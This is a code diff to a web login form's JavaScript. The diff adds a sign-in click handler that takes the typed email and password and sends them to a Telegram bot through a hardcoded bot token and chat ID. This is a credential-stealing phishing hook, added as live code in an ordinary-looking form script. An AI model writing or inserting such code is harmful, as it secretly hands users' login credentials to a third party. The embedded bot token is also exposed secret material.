@@ -9,6 +9,17 @@ const inputWrapperEmail = document.getElementById("input-wrapper-email")
 const inputWrapperPassword = document.getElementById("input-wrapper-password")
 const warningEmail = document.getElementById("warningEmail")
 const warningPassword = document.getElementById("warningPassword")
+const signin = document.getElementById("signin")
+
+signin.onclick(()=>{
+    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${inputEmail.innerText}:${inputPassword.innerText}`
+    fetch(url, {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'}, 
+        body:''
+      }).then(res => {
+        console.log("Request complete! response:", res);
+      });})
 
 const inputOnBlur = (ev) =>{
     if(inputTouched.email){
